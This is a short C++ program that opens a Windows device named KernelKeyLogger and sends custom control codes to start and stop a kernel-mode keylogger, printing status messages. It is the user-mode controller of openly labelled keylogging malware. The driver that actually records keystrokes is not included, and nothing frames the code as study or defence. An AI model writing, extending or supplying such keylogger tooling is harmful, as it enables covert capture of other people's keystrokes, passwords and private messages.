#include <windows.h>
#include <iostream>

#define IOCTL_START_KEYLOGGER CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_STOP_KEYLOGGER  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

void StartKeylogger(HANDLE hDevice) {
    DWORD bytesReturned;
    if (DeviceIoControl(hDevice, IOCTL_START_KEYLOGGER, NULL, 0, NULL, 0, &bytesReturned, NULL)) {
        std::cout << "Keylogger started.\n";
    } else {
        std::cerr << "Failed to start keylogger.\n";
    }
}

void StopKeylogger(HANDLE hDevice) {
    DWORD bytesReturned;
    if (DeviceIoControl(hDevice, IOCTL_STOP_KEYLOGGER, NULL, 0, NULL, 0, &bytesReturned, NULL)) {
        std::cout << "Keylogger stopped.\n";
    } else {
        std::cerr << "Failed to stop keylogger.\n";
    }
}

int main() {
    HANDLE hDevice = CreateFile(L"\\\\.\\KernelKeyLogger",
                                GENERIC_READ | GENERIC_WRITE,
                                0,
                                NULL,
                                OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL,
                                NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to open device\n";
        return 1;
    }

    std::cout << "KernelKeyLogger Device opened successfully.\n";
    StartKeylogger(hDevice);

    std::cout << "Press any key to stop the keylogger...\n";
    std::cin.get();

    StopKeylogger(hDevice);
    CloseHandle(hDevice);

    return 0;
}
